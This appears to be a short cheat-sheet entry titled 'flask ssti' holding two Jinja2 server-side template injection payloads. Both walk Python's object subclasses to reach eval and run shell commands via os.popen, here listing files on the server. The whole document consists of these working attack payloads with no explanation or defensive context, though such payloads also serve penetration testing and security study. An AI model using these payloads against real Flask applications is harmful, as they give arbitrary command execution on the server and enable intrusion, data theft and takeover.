

## flask ssti

### payload0
```
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls -r /*/*").read()')}}
```

### payload1
```
{% for c in [].__class__.__base__.__subclasses__() %}
 {% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.func_globals.values() %} 
  {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__("os").popen("ls").read()') }} 
  {% endif %}
   {% endif %} 
   {% endfor %} 
   {% endif %} 
   {% endfor %} 
  ```

